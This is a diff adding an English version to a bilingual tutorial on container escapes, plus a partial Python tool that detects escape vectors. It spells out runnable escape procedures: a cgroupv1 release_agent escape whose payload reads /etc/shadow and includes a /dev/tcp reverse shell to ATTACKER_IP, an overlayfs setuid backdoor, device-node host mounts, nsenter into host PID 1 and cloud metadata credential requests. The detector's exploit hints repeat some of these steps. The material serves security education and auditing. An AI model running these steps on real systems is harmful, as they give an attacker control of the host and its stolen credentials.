@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 컨테이너 탈출 심화: 커널 취약점 및 네임스페이스 탈출
 
 ## 1. 컨테이너 격리 메커니즘 심층 분석
@@ -1195,6 +1201,1213 @@ docker run --security-opt apparmor=myapp-profile nginx
 update-grub && reboot
 
 # 6. 읽기 전용 루트 + tmpfs 조합
+docker run \
+  --read-only \
+  --tmpfs /tmp:rw,noexec,nosuid \
+  --tmpfs /run:rw,noexec,nosuid \
+  nginx
+```
+
+---
+
+<a name="english"></a>
+
+# Container Escape In Depth: Kernel Vulnerabilities and Namespace Escapes
+
+## 1. Deep Dive into Container Isolation Mechanisms
+
+Docker/Kubernetes containers implement isolation by combining the following Linux kernel features.
+
+```
+Isolation Mechanisms
+├── Namespaces (scope restriction)
+│   ├── mnt  → filesystem mount points
+│   ├── pid  → process ID space
+│   ├── net  → network interfaces/routing
+│   ├── ipc  → IPC objects
+│   ├── uts  → hostname/domain name
+│   ├── user → UID/GID mapping
+│   └── cgroup → cgroup root
+│
+├── cgroups (resource limits)
+│   ├── cpu / memory / io
+│   └── devices (allowed device access)
+│
+├── Capabilities (root privilege granularization)
+│   ├── CAP_SYS_ADMIN (most dangerous)
+│   ├── CAP_NET_ADMIN
+│   └── ...38 capabilities total
+│
+├── Seccomp (syscall filtering)
+│   └── Docker default: ~44 of ~300 blocked
+│
+└── AppArmor / SELinux (mandatory access control)
+```
+
+---
+
+## 2. runc Vulnerability: CVE-2019-5736 (Runc Overwrite)
+
+### Vulnerability Overview
+
+In runc versions 1.0-rc6 and below, an attacker inside a container can overwrite the host's runc binary via `/proc/self/exe`.
+
+```
+Attack flow:
+Attacker inside container
+    ↓ /proc/self/exe → symbolic link to host runc binary
+    ↓ triggered by runc exec or runc run
+    ↓ write race while fd is open
+    → overwrite host runc binary → arbitrary code execution on next runc invocation
+```
+
+```bash
+# Check affected version
+runc --version
+# runc version 1.0.0-rc5 or below → vulnerable
+
+# PoC concept (actual exploit requires timing race condition)
+# From inside the container:
+cat /proc/self/exe | file -  # verify current runc binary
+ls -la /proc/self/fd/        # check open file descriptors
+
+# CVE-2019-5736 PoC reference (conceptual)
+# 1. Create symbolic link pointing to /proc/self/exe
+# 2. Re-execute self via execve while keeping fd open
+# 3. When runc opens /proc/<pid>/exe during container process initialization
+# 4. Win race condition, reopen with O_WRONLY
+# 5. Write malicious payload
+```
+
+```bash
+# Defense: upgrade to latest runc
+apt-get install --only-upgrade runc containerd
+runc --version  # verify 1.1.x or higher
+
+# Or use gVisor/Kata Containers (hypervisor-based isolation)
+```
+
+---
+
+## 3. Abusing CAP_SYS_ADMIN
+
+### 3.1 cgroupv1 notify_on_release Escape
+
+The most well-known technique for executing host code using `CAP_SYS_ADMIN` + cgroupv1.
+
+```bash
+# Check prerequisites
+cat /proc/self/cgroup | head -5
+ls /sys/fs/cgroup/
+# cgroupv1: separate mounts at /sys/fs/cgroup/memory, /sys/fs/cgroup/cpu, etc.
+# cgroupv2: single unified mount at /sys/fs/cgroup/unified
+
+# ── Full cgroupv1 escape procedure ──────────────────────────────────────────
+
+# 1. Mount rdma (or another) cgroup subsystem
+mkdir /tmp/cgrp
+mount -t cgroup -o rdma cgroup /tmp/cgrp
+
+# If rdma is unavailable:
+mount -t cgroup -o memory cgroup /tmp/cgrp
+
+# 2. Create a child cgroup
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# 3. Determine the container's overlayfs path on the host
+host_path=$(cat /etc/mtab | grep overlay | grep -oP 'upperdir=\K[^,]+')
+# Or:
+host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)
+echo "Host path: $host_path"
+
+# 4. Set release_agent (path to be executed on the host)
+echo "$host_path/escape_payload" > /tmp/cgrp/release_agent
+
+# 5. Write payload script (written to host_path from inside the container)
+cat > /escape_payload << 'EOF'
+#!/bin/sh
+id > /escape_output
+hostname >> /escape_output
+cat /etc/shadow >> /escape_output
+# Reverse shell:
+# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+chmod +x /escape_payload
+
+# 6. Terminate a process in the cgroup to trigger notify_on_release
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+# 7. Check results (after a moment)
+sleep 1
+cat /escape_output   # output from command executed on host
+```
+
+### 3.2 Filesystem Escape via CAP_SYS_ADMIN + Mount
+
+```bash
+# Mount tmpfs then access host files via overlayfs
+mkdir /tmp/lower /tmp/upper /tmp/work /tmp/merged
+
+# overlayfs mount (requires CAP_SYS_ADMIN)
+mount -t overlay overlay \
+  -o lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work \
+  /tmp/merged
+
+# Bypass restrictions by remounting procfs
+mount -t proc proc /proc  # new proc mount
+
+# Access devices via sysfs
+ls /sys/block/  # list host block devices
+```
+
+---
+
+## 4. OverlayFS Vulnerabilities
+
+### CVE-2021-3493 (Ubuntu OverlayFS Privilege Escalation)
+
+```bash
+# Check vulnerable kernel versions
+uname -r
+# Ubuntu 5.11.0-25 or below, 5.8.0-63 or below → vulnerable
+
+# Concept: user namespace + overlayfs combination allows setuid file creation
+# Create setuid file in overlayfs upper dir → setuid preserved on host when merged
+
+# PoC concept
+unshare -Urm  # unshare user namespace + mount namespace
+# Inside:
+mkdir -p /tmp/ol/{lower,upper,work,merged}
+mount -t overlay overlay \
+  -o lowerdir=/tmp/ol/lower,upperdir=/tmp/ol/upper,workdir=/tmp/ol/work \
+  /tmp/ol/merged
+
+# Create setuid binary
+cp /bin/bash /tmp/ol/merged/backdoor
+chmod +s /tmp/ol/merged/backdoor
+
+# Executing outside user namespace preserves setuid
+/tmp/ol/upper/backdoor -p  # effective uid = 0
+```
+
+### CVE-2023-0386 (OverlayFS NOSUID bypass)
+
+```bash
+# Affected scope: before Linux 6.1.x
+# Create setuid file in overlayfs upper dir within user namespace;
+# SUID bit is preserved when executing from host namespace
+
+# Detection
+grep "overlay" /proc/mounts
+ls -la /proc/self/ns/user  # check user namespace ID
+```
+
+---
+
+## 5. cgroupv1 devices.list Escape
+
+```bash
+# Check allowed devices via cgroup devices controller
+cat /sys/fs/cgroup/devices/devices.list
+
+# If block device access is permitted:
+# a *:* rwm → all devices accessible (privileged)
+
+# Create host device node with mknod
+mknod /tmp/host_disk b 8 1  # /dev/sda1
+mount /tmp/host_disk /mnt/host
+chroot /mnt/host /bin/bash
+```
+
+---
+
+## 6. Namespace Escape Techniques
+
+### 6.1 Privilege Mapping via User Namespace
+
+```bash
+# Create user namespace (available to non-root users)
+unshare --user --pid --mount --fork /bin/bash
+
+# Verify UID 0 inside
+id  # uid=0(root) gid=0(root)
+
+# Map host UID via /proc/<pid>/uid_map
+echo "0 1000 1" > /proc/self/uid_map
+echo "0 1000 1" > /proc/self/gid_map
+```
+
+### 6.2 PID Namespace Escape
+
+```bash
+# When hostPID=true: nsenter into host process 1 (init)
+nsenter -t 1 --mount --uts --ipc --net --pid -- bash
+
+# Access file descriptors of host processes
+ls /proc/1/fd
+cat /proc/1/root/etc/shadow
+
+# Access host process memory via ptrace
+# (requires CAP_SYS_PTRACE)
+gdb -p 1
+# (gdb) info proc
+# (gdb) x/20x 0x... (read memory)
+```
+
+### 6.3 Net Namespace Escape
+
+```bash
+# Check host network interfaces (hostNetwork=true)
+ip link show
+ip route show
+
+# Access cloud metadata APIs (AWS, GCP, Azure)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+
+# IMDSv2 (AWS)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+---
+
+## 7. Seccomp Bypass
+
+```bash
+# Check Docker default seccomp profile
+docker inspect <container> | python3 -c "
+import json, sys
+d = json.load(sys.stdin)
+sc = d[0]['HostConfig'].get('SecurityOpt', [])
+print('SecurityOpt:', sc)
+"
+
+# If seccomp=unconfined → all syscalls allowed
+# → ptrace, keyctl, personality etc. unrestricted
+
+# Test whether unshare syscall is permitted
+unshare -r /bin/bash
+id  # if uid=0 then it is allowed
+
+# Analyze seccomp profile
+cat /etc/docker/seccomp-custom.json | python3 -c "
+import json, sys
+profile = json.load(sys.stdin)
+blocked = [s['names'] for s in profile.get('syscalls', []) if s['action'] == 'SCMP_ACT_ERRNO']
+print('Blocked syscalls:', blocked)
+"
+```
+
+---
+
+## 8. Python CLI Tool: Automated Container Vulnerability Detector
+
+```python
+#!/usr/bin/env python3
+"""
+container_escape_detector.py - Automated container escape vulnerability detection CLI
+
+Usage:
+  python container_escape_detector.py check-all
+  python container_escape_detector.py check-caps
+  python container_escape_detector.py check-namespaces
+  python container_escape_detector.py check-cgroups
+  python container_escape_detector.py check-mounts
+  python container_escape_detector.py check-kernel
+  python container_escape_detector.py report --output report.json
+"""
+
+from __future__ import annotations
+
+import argparse
+import ctypes
+import json
+import os
+import platform
+import re
+import socket
+import struct
+import subprocess
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field, asdict
+from pathlib import Path
+from typing import Any
+
+
+# ── Linux Capabilities constants ─────────────────────────────────────────────
+
+CAP_DEFINITIONS: dict[int, tuple[str, str]] = {
+    0:  ("CAP_CHOWN", "change file ownership"),
+    1:  ("CAP_DAC_OVERRIDE", "bypass DAC permissions"),
+    2:  ("CAP_DAC_READ_SEARCH", "bypass read/search DAC"),
+    3:  ("CAP_FOWNER", "file owner permissions"),
+    4:  ("CAP_FSETID", "set SUID/SGID"),
+    5:  ("CAP_KILL", "send signals to processes"),
+    6:  ("CAP_SETGID", "set GID"),
+    7:  ("CAP_SETUID", "set UID"),
+    8:  ("CAP_SETPCAP", "manage capabilities"),
+    9:  ("CAP_LINUX_IMMUTABLE", "immutable flag"),
+    10: ("CAP_NET_BIND_SERVICE", "bind ports below 1024"),
+    11: ("CAP_NET_BROADCAST", "network broadcast"),
+    12: ("CAP_NET_ADMIN", "network administration"),
+    13: ("CAP_NET_RAW", "raw sockets"),
+    14: ("CAP_IPC_LOCK", "memory locking"),
+    15: ("CAP_IPC_OWNER", "IPC ownership"),
+    16: ("CAP_SYS_MODULE", "kernel modules"),
+    17: ("CAP_SYS_RAWIO", "raw I/O"),
+    18: ("CAP_SYS_CHROOT", "chroot"),
+    19: ("CAP_SYS_PTRACE", "ptrace"),
+    20: ("CAP_SYS_PACCT", "process accounting"),
+    21: ("CAP_SYS_ADMIN", "system administration (most dangerous)"),
+    22: ("CAP_SYS_BOOT", "system reboot"),
+    23: ("CAP_SYS_NICE", "process priority"),
+    24: ("CAP_SYS_RESOURCE", "resource limits"),
+    25: ("CAP_SYS_TIME", "system time"),
+    26: ("CAP_SYS_TTY_CONFIG", "TTY configuration"),
+    27: ("CAP_MKNOD", "create device files"),
+    28: ("CAP_LEASE", "file leasing"),
+    29: ("CAP_AUDIT_WRITE", "audit log writing"),
+    30: ("CAP_AUDIT_CONTROL", "audit control"),
+    31: ("CAP_SETFCAP", "file capabilities"),
+    32: ("CAP_MAC_OVERRIDE", "bypass MAC"),
+    33: ("CAP_MAC_ADMIN", "MAC administration"),
+    34: ("CAP_SYSLOG", "syslog"),
+    35: ("CAP_WAKE_ALARM", "wake alarm"),
+    36: ("CAP_BLOCK_SUSPEND", "block suspend"),
+    37: ("CAP_AUDIT_READ", "read audit log"),
+    38: ("CAP_PERFMON", "performance monitoring"),
+    39: ("CAP_BPF", "BPF usage"),
+    40: ("CAP_CHECKPOINT_RESTORE", "checkpoint/restore"),
+}
+
+# Capabilities directly exploitable for escape
+CRITICAL_CAPS = {21, 16, 19, 12, 13, 17, 27}  # SYS_ADMIN, SYS_MODULE, SYS_PTRACE, etc.
+HIGH_CAPS = {0, 1, 6, 7, 18, 31}              # CHOWN, DAC_OVERRIDE, SETUID, SETGID, CHROOT, SETFCAP
+
+
+# ── Data classes ─────────────────────────────────────────────────────────────
+
+@dataclass
+class Finding:
+    category: str
+    name: str
+    severity: str        # CRITICAL / HIGH / MEDIUM / LOW / INFO
+    detected: bool
+    description: str
+    evidence: str = ""
+    exploit_hint: str = ""
+
+
+@dataclass
+class CapabilityInfo:
+    cap_id: int
+    cap_name: str
+    description: str
+    present_in_effective: bool
+    present_in_permitted: bool
+    present_in_inheritable: bool
+    severity: str = "LOW"
+
+
+@dataclass
+class MountInfo:
+    device: str
+    mount_point: str
+    fs_type: str
+    options: str
+    is_host_path: bool = False
+    is_sensitive: bool = False
+
+
+# ── Detection functions ───────────────────────────────────────────────────────
+
+def get_process_capabilities(pid: int = 0) -> dict[str, int]:
+    """Read process capability hex values"""
+    status_file = f"/proc/{pid}/status" if pid else "/proc/self/status"
+    caps: dict[str, int] = {}
+    try:
+        with open(status_file) as f:
+            for line in f:
+                for key in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"):
+                    if line.startswith(f"{key}:"):
+                        caps[key] = int(line.split()[1], 16)
+    except OSError:
+        pass
+    return caps
+
+
+def decode_capabilities(cap_hex: int) -> list[CapabilityInfo]:
+    """Decode capability hex value into individual capability list"""
+    result: list[CapabilityInfo] = []
+    for bit, (name, desc) in CAP_DEFINITIONS.items():
+        if cap_hex & (1 << bit):
+            severity = "CRITICAL" if bit in CRITICAL_CAPS else (
+                "HIGH" if bit in HIGH_CAPS else "MEDIUM"
+            )
+            result.append(CapabilityInfo(
+                cap_id=bit,
+                cap_name=name,
+                description=desc,
+                present_in_effective=True,  # simplified
+                present_in_permitted=True,
+                present_in_inheritable=False,
+                severity=severity,
+            ))
+    return result
+
+
+def check_capabilities() -> list[Finding]:
+    """Check capabilities of the current process"""
+    findings: list[Finding] = []
+    caps = get_process_capabilities()
+
+    cap_eff = caps.get("CapEff", 0)
+    cap_prm = caps.get("CapPrm", 0)
+    cap_bnd = caps.get("CapBnd", 0)
+
+    # Check for fully privileged (CapEff = 0x3fffffffff or max)
+    max_cap = (1 << 41) - 1
+    is_fully_privileged = (cap_eff & max_cap) == max_cap
+    findings.append(Finding(
+        category="capabilities",
+        name="Fully Privileged (--privileged)",
+        severity="CRITICAL" if is_fully_privileged else "INFO",
+        detected=is_fully_privileged,
+        description="Fully privileged container with all capabilities",
+        evidence=f"CapEff: {cap_eff:#018x}",
+        exploit_hint="cgroup notify_on_release, block device mount, nsenter escape possible"
+    ))
+
+    # Individual dangerous capabilities
+    for bit in CRITICAL_CAPS | HIGH_CAPS:
+        if cap_eff & (1 << bit):
+            name, desc = CAP_DEFINITIONS.get(bit, (f"CAP_{bit}", ""))
+            severity = "CRITICAL" if bit in CRITICAL_CAPS else "HIGH"
+            exploit_hints = {
+                21: "cgroup release_agent, mount manipulation → host code execution",
+                16: "load kernel modules → rootkits, backdoors",
+                19: "ptrace host processes → read/write memory",
+                12: "modify iptables rules, network sniffing",
+                13: "raw socket sniffing, ARP spoofing",
+                17: "direct I/O access → disk read/write",
+                27: "mknod to create device files",
+                7: "setuid to UID 0",
+                6: "setgid to GID 0",
+            }
+            findings.append(Finding(
+                category="capabilities",
+                name=name,
+                severity=severity,
+                detected=True,
+                description=desc,
+                evidence=f"bit {bit} set in CapEff: {cap_eff:#018x}",
+                exploit_hint=exploit_hints.get(bit, "")
+            ))
+
+    return findings
+
+
+def check_namespaces() -> list[Finding]:
+    """Check namespace isolation state"""
+    findings: list[Finding] = []
+
+    ns_pairs = [
+        ("mnt", "Mount namespace", "filesystem isolation"),
+        ("pid", "PID namespace", "process isolation"),
+        ("net", "Network namespace", "network isolation"),
+        ("ipc", "IPC namespace", "IPC isolation"),
+        ("uts", "UTS namespace", "hostname isolation"),
+        ("user", "User namespace", "UID/GID isolation"),
+    ]
+
+    for ns_type, ns_desc, isolation_desc in ns_pairs:
+        try:
+            self_ns = os.readlink(f"/proc/self/ns/{ns_type}")
+            init_ns = os.readlink(f"/proc/1/ns/{ns_type}")
+            shared = self_ns == init_ns
+
+            severity_map = {
+                "mnt": "HIGH",
+                "pid": "HIGH",
+                "net": "MEDIUM",
+                "user": "LOW",
+            }
+            severity = severity_map.get(ns_type, "MEDIUM") if shared else "INFO"
+
+            findings.append(Finding(
+                category="namespaces",
+                name=f"Shared {ns_type.upper()} Namespace",
+                severity=severity,
+                detected=shared,
+                description=f"{ns_desc} shared: no {isolation_desc}",
+                evidence=f"self: {self_ns} | init: {init_ns}",
+                exploit_hint=f"nsenter -t 1 --{ns_type} -- bash" if shared else ""
+            ))
+        except OSError:
+            pass
+
+    # Check if /proc/1/root is accessible (shared mount namespace)
+    try:
+        os.listdir("/proc/1/root")
+        findings.append(Finding(
+            category="namespaces",
+            name="/proc/1/root Accessible",
+            severity="CRITICAL",
+            detected=True,
+            description="Direct access to init process root filesystem",
+            evidence="/proc/1/root",
+            exploit_hint="chroot /proc/1/root or cat /proc/1/root/etc/shadow"
+        ))
+    except (PermissionError, OSError):
+        findings.append(Finding(
+            category="namespaces",
+            name="/proc/1/root Accessible",
+            severity="INFO",
+            detected=False,
+            description="Access to init root filesystem is blocked (normal)"
+        ))
+
+    return findings
+
+
+def check_cgroups() -> list[Finding]:
+    """Check cgroup security configuration"""
+    findings: list[Finding] = []
+
+    # Check cgroupv1 vs v2
+    cgroup_unified = Path("/sys/fs/cgroup/cgroup.controllers")
+    is_cgroupv2 = cgroup_unified.exists()
+    findings.append(Finding(
+        category="cgroups",
+        name=f"cgroup v{'2' if is_cgroupv2 else '1'} in use",
+        severity="INFO" if is_cgroupv2 else "MEDIUM",
+        detected=True,
+        description="cgroupv1 is vulnerable to notify_on_release escape technique",
+        evidence="/sys/fs/cgroup/cgroup.controllers" if is_cgroupv2 else "/sys/fs/cgroup/"
+    ))
+
+    # Check if release_agent is writable
+    release_agents: list[str] = []
+    cgroup_base = Path("/sys/fs/cgroup")
+    if cgroup_base.exists() and not is_cgroupv2:
+        for agent_path in cgroup_base.rglob("release_agent"):
+            if os.access(str(agent_path), os.W_OK):
+                release_agents.append(str(agent_path))
+
+    findings.append(Finding(
+        category="cgroups",
+        name="Writable cgroup release_agent",
+        severity="CRITICAL" if release_agents else "INFO",
+        detected=bool(release_agents),
+        description="Write access to cgroupv1 release_agent → arbitrary command execution on host",
+        evidence="\n".join(release_agents) if release_agents else "none",
+        exploit_hint=(
+            "1. mkdir /tmp/x && mount -t cgroup cgroup /tmp/x\n"
+            "2. echo 1 > /tmp/x/<subsys>/notify_on_release\n"
+            "3. echo <host_path>/payload > /tmp/x/<subsys>/release_agent\n"
+            "4. sh -c 'echo $$ > /tmp/x/<subsys>/cgroup.procs'"
+        ) if release_agents else ""
+    ))
+
+    # Check if devices.allow is writable
+    devices_allow_writable: list[str] = []
+    for da_path in cgroup_base.rglob("devices.allow"):
+        if os.access(str(da_path), os.W_OK):
+            devices_allow_writable.append(str(da_path))
+
+    if devices_allow_writable:
+        findings.append(Finding(
+            category="cgroups",
+            name="Writable devices.allow",
+            severity="HIGH",
+            detected=True,
+            description="Write access to devices.allow → can grant new device access",
+            evidence="\n".join(devices_allow_writable),
+            exploit_hint="echo 'a *:* rwm' > devices.allow → access all devices"
+        ))
+
+    # Check current container's devices.list
+    current_cgroup_file = Path("/proc/self/cgroup")
+    if current_cgroup_file.exists():
+        try:
+            with open(current_cgroup_file) as f:
+                cgroup_content = f.read()
+            # Parse devices cgroup path
+            for line in cgroup_content.splitlines():
+                parts = line.split(":", 2)
+                if len(parts) == 3 and "devices" in parts[1]:
+                    devices_list = Path(f"/sys/fs/cgroup/devices{parts[2]}/devices.list")
+                    if devices_list.exists():
+                        content = devices_list.read_text().strip()
+                        if content == "a *:* rwm":
+                            findings.append(Finding(
+                                category="cgroups",
+                                name="All Devices Allowed",
+                                severity="CRITICAL",
+                                detected=True,
+                                description="All device access permitted (privileged container)",
+                                evidence=f"{devices_list}: {content}",
+                                exploit_hint="mknod /tmp/host_disk b 8 1 && mount /tmp/host_disk /mnt"
+                            ))
+        except OSError:
+            pass
+
+    return findings
+
+
+def check_mounts() -> list[Finding]:
+    """Check mount point security"""
+    findings: list[Finding] = []
+    mounts: list[MountInfo] = []
+
+    sensitive_host_paths = {
+        "/": "host root filesystem",
+        "/etc": "system configuration directory",
+        "/root": "root home directory",
+        "/proc": "kernel virtual filesystem",
+        "/sys": "sysfs",
+        "/var/run/docker.sock": "Docker daemon socket",
+        "/run/docker.sock": "Docker daemon socket",
+        "/var/run/containerd": "containerd socket",
+        "/run/containerd": "containerd socket",
+        "/home": "user home directories",
+        "/var/lib/kubelet": "kubelet data",
+        "/etc/kubernetes": "Kubernetes configuration",
+    }
+
+    try:
+        with open("/proc/mounts") as f:
+            for line in f:
+                parts = line.split()
+                if len(parts) < 4:
+                    continue
+                device, mount_point, fs_type, options = parts[0], parts[1], parts[2], parts[3]
+                is_sensitive = False
+                for path, desc in sensitive_host_paths.items():
+                    # bind mount: device looks like a host path
+                    if device.startswith("/") and device in sensitive_host_paths:
+                        is_sensitive = True
+                    if mount_point == path or device == path:
+                        is_sensitive = True
+
+                is_host_path = device.startswith("/") and not device.startswith("/dev")
+                mounts.append(MountInfo(
+                    device=device,
+                    mount_point=mount_point,
+                    fs_type=fs_type,
+                    options=options,
+                    is_host_path=is_host_path,
+                    is_sensitive=is_sensitive,
+                ))
+    except OSError:
+        pass
+
+    # Docker socket mount
+    docker_sock_mounted = any(
+        m.device in ("/var/run/docker.sock", "/run/docker.sock") or
+        m.mount_point in ("/var/run/docker.sock", "/run/docker.sock")
+        for m in mounts
+    )
+    findings.append(Finding(
+        category="mounts",
+        name="Docker Socket Mounted",
+        severity="CRITICAL" if docker_sock_mounted else "INFO",
+        detected=docker_sock_mounted,
+        description="Docker socket mounted inside container → full host Docker control",
+        evidence="/var/run/docker.sock" if docker_sock_mounted else "none",
+        exploit_hint="docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it ubuntu chroot /host"
+    ))
+
+    # Sensitive host path bind mounts
+    host_binds = [m for m in mounts if m.is_sensitive and m.is_host_path]
+    for m in host_binds:
+        findings.append(Finding(
+            category="mounts",
+            name=f"Sensitive Host Path: {m.device}",
+            severity="HIGH",
+            detected=True,
+            description=f"Sensitive host path mounted at {m.mount_point}",
+            evidence=f"{m.device} → {m.mount_point} ({m.fs_type})"
+        ))
+
+    # Check /proc write access
+    writable_proc_items = []
+    dangerous_proc = [
+        "/proc/sysrq-trigger",
+        "/proc/sys/kernel/core_pattern",
+        "/proc/sys/kernel/modprobe",
+    ]
+    for proc_path in dangerous_proc:
+        if Path(proc_path).exists() and os.access(proc_path, os.W_OK):
+            writable_proc_items.append(proc_path)
+
+    if writable_proc_items:
+        findings.append(Finding(
+            category="mounts",
+            name="Writable /proc Entries",
+            severity="HIGH",
+            detected=True,
+            description="Writable /proc entries found",
+            evidence="\n".join(writable_proc_items),
+            exploit_hint="Write |/path/to/payload to /proc/sys/kernel/core_pattern then trigger coredump"
+        ))
+
+    return findings
+
+
+def check_kernel_version() -> list[Finding]:
+    """Check for known vulnerabilities based on kernel version"""
+    findings: list[Finding] = []
+
+    try:
+        kernel_version = platform.release()
+    except Exception:
+        kernel_version = "unknown"
+
+    findings.append(Finding(
+        category="kernel",
+        name="Kernel Version",
+        severity="INFO",
+        detected=True,
+        description=f"Kernel version: {kernel_version}",
+        evidence=kernel_version
+    ))
+
+    # Known vulnerable version list related to container escapes
+    known_vulns: list[tuple[str, str, str, str]] = [
+        # (CVE, description, affected version pattern, recommendation)
+        ("CVE-2019-5736", "runc /proc/self/exe overwrite", "runc 1.0-rc6 or below", "upgrade to runc 1.0-rc7+"),
+        ("CVE-2020-14386", "net/packet UAF → root privilege escalation", "before 5.8", "upgrade to 5.8+"),
+        ("CVE-2021-3493", "Ubuntu overlayfs setuid privilege escalation", "5.11.0-25 or below", "apply upstream patch"),
+        ("CVE-2022-0492", "cgroup v1 release_agent escape", "before 5.17", "use cgroupv2 or apply patch"),
+        ("CVE-2023-0386", "overlayfs NOSUID bypass", "before 6.1", "upgrade to 6.1.12+"),
+    ]
+
+    # Check runc version
+    try:
+        result = subprocess.run(
+            ["runc", "--version"], capture_output=True, text=True, timeout=5
+        )
+        runc_ver = result.stdout.split("\n")[0] if result.returncode == 0 else "unknown"
+        findings.append(Finding(
+            category="kernel",
+            name="runc Version",
+            severity="INFO",
+            detected=True,
+            description=f"runc version: {runc_ver}",
+            evidence=runc_ver
+        ))
+    except (FileNotFoundError, subprocess.TimeoutExpired):
+        pass
+
+    # Parse kernel version (major.minor.patch)
+    version_match = re.match(r"(\d+)\.(\d+)\.(\d+)", kernel_version)
+    if version_match:
+        major, minor, patch = map(int, version_match.groups())
+
+        # CVE-2022-0492: before 5.17
+        if (major < 5) or (major == 5 and minor < 17):
+            findings.append(Finding(
+                category="kernel",
+                name="CVE-2022-0492 (cgroup v1 escape)",
+                severity="HIGH",
+                detected=True,
+                description="Container escape via cgroup v1 release_agent possible",
+                evidence=f"Current kernel: {kernel_version} < 5.17",
+                exploit_hint="Exploitable with CAP_NET_ADMIN + unprivileged user namespace"
+            ))
+
+        # CVE-2023-0386: before 6.1
+        if (major < 6) or (major == 6 and minor < 1):
+            findings.append(Finding(
+                category="kernel",
+                name="CVE-2023-0386 (overlayfs NOSUID bypass)",
+                severity="MEDIUM",
+                detected=True,
+                description="SUID bit preservation vulnerability in overlayfs upper directory",
+                evidence=f"Current kernel: {kernel_version} < 6.1",
+                exploit_hint="Create setuid file using user namespace + overlayfs combination"
+            ))
+
+    return findings
+
+
+def check_seccomp_apparmor() -> list[Finding]:
+    """Check Seccomp and AppArmor profile application"""
+    findings: list[Finding] = []
+
+    # Seccomp status
+    try:
+        with open("/proc/self/status") as f:
+            status = f.read()
+        seccomp_line = [l for l in status.splitlines() if l.startswith("Seccomp:")]
+        if seccomp_line:
+            seccomp_mode = int(seccomp_line[0].split()[1])
+            modes = {0: "disabled", 1: "strict", 2: "filter"}
+            mode_str = modes.get(seccomp_mode, "unknown")
+            findings.append(Finding(
+                category="seccomp",
+                name="Seccomp Mode",
+                severity="MEDIUM" if seccomp_mode == 0 else "INFO",
+                detected=seccomp_mode == 0,
+                description=f"Seccomp: {mode_str} (0=disabled, 1=strict, 2=filter)",
+                evidence=f"Seccomp: {seccomp_mode} ({mode_str})",
+                exploit_hint="Seccomp disabled → ptrace, keyctl, unshare etc. unrestricted" if seccomp_mode == 0 else ""
+            ))
+    except OSError:
+        pass
+
+    # AppArmor status
+    aa_enabled = Path("/sys/kernel/security/apparmor/enabled")
+    aa_profile = Path("/proc/self/attr/current")
+    if aa_enabled.exists():
+        try:
+            enabled = aa_enabled.read_text().strip() == "Y"
+            profile = aa_profile.read_text().strip() if aa_profile.exists() else "unknown"
+            findings.append(Finding(
+                category="apparmor",
+                name="AppArmor Profile",
+                severity="INFO" if enabled else "MEDIUM",
+                detected=not enabled,
+                description=f"AppArmor: {'enabled' if enabled else 'disabled'}, profile: {profile}",
+                evidence=profile
+            ))
+        except OSError:
+            pass
+
+    return findings
+
+
+def check_environment() -> list[Finding]:
+    """Detect sensitive information in environment variables and files"""
+    findings: list[Finding] = []
+
+    sensitive_env_patterns = [
+        "password", "passwd", "secret", "token", "key", "api_key",
+        "aws_secret", "gcp_key", "azure", "db_pass", "database_url",
+    ]
+
+    env_findings: list[str] = []
+    for key, val in os.environ.items():
+        if any(pat in key.lower() for pat in sensitive_env_patterns):
+            env_findings.append(f"{key}={'*' * min(len(val), 16)}")
+
+    if env_findings:
+        findings.append(Finding(
+            category="environment",
+            name="Sensitive Environment Variables",
+            severity="HIGH",
+            detected=True,
+            description="Sensitive information present in environment variables",
+            evidence="\n".join(env_findings)
+        ))
+
+    # K8s SA token file
+    sa_token = Path("/var/run/secrets/kubernetes.io/serviceaccount/token")
+    if sa_token.exists():
+        token_content = sa_token.read_text().strip()
+        findings.append(Finding(
+            category="environment",
+            name="Kubernetes SA Token",
+            severity="MEDIUM",
+            detected=True,
+            description="ServiceAccount token is auto-mounted",
+            evidence=f"{sa_token}: {token_content[:40]}...",
+            exploit_hint="kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods"
+        ))
+
+    return findings
+
+
+# ── Comprehensive checks ──────────────────────────────────────────────────────
+
+def run_all_checks(verbose: bool = False) -> list[Finding]:
+    """Parallel check of all escape vectors"""
+    check_functions = [
+        ("capabilities", check_capabilities),
+        ("namespaces", check_namespaces),
+        ("cgroups", check_cgroups),
+        ("mounts", check_mounts),
+        ("kernel vulnerabilities", check_kernel_version),
+        ("Seccomp/AppArmor", check_seccomp_apparmor),
+        ("environment", check_environment),
+    ]
+
+    all_findings: list[Finding] = []
+
+    with ThreadPoolExecutor(max_workers=7) as executor:
+        futures = {
+            executor.submit(fn): name
+            for name, fn in check_functions
+        }
+        for future in as_completed(futures):
+            category_name = futures[future]
+            try:
+                results = future.result()
+                all_findings.extend(results)
+                if verbose:
+                    print(f"[*] {category_name} check complete: {len(results)} items")
+            except Exception as e:
+                print(f"[-] {category_name} check error: {e}")
+
+    return all_findings
+
+
+def print_findings(findings: list[Finding], only_detected: bool = False) -> None:
+    """Print results"""
+    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+    sorted_findings = sorted(
+        findings,
+        key=lambda f: (severity_order.get(f.severity, 99), not f.detected)
+    )
+
+    detected = [f for f in sorted_findings if f.detected]
+    not_detected = [f for f in sorted_findings if not f.detected]
+
+    if detected:
+        print(f"\n{'='*70}")
